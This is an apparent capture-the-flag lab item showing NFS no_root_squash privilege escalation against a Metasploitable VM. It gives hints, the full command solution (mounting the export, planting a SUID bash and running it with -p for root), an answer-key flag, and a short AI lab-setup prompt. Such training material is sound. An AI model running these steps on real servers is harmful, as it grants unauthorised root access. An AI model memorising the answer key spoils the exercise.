# Q059 — NFS no_root_squash Privesc

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` / `192.168.52.130` |
| **Domain** | 05 — System Hacking |
| **Difficulty** | 🔴 Hard |
| **Tools** | `metasploit`, `hydra`, `john`, `hashcat`, `linpeas`, `mimikatz` |
| **Time budget** | 15–25 min |

---

## 📝 Question

Mount Metasploitable's `/` NFS export from Parrot, drop a SUID `/bin/bash`, then execute it on the target via SSH/shell to gain root.

---

## 🎯 Flag Format

```
exploit=<noroot-squash|root_squash>
```

Example: `exploit=noroot-squash`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Mount: `mkdir /mnt/m; sudo mount -t nfs 192.168.52.129:/ /mnt/m`.
</details>

<details>
<summary>Hint 2</summary>

Place SUID bash; `bash -p` from msfadmin shell.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
sudo mkdir -p /mnt/m
sudo mount -t nfs 192.168.52.129:/ /mnt/m
sudo cp /bin/bash /mnt/m/tmp/rootbash
sudo chmod +s /mnt/m/tmp/rootbash
# On target: /tmp/rootbash -p
```

Yields root shell via no_root_squash misconfig.

**Answer:** `exploit=noroot-squash`

📖 Ref: [playbooks/system-hacking-playbook.md](../../playbooks/system-hacking-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
1. Verify VMs running: ping 192.168.52.129 and ping 192.168.52.130 from 192.168.52.128.
2. Required services for this Q already up by default on the relevant target.
3. If something is down, restart it on the target VM.

Report back: "Lab ready for Q059".
```
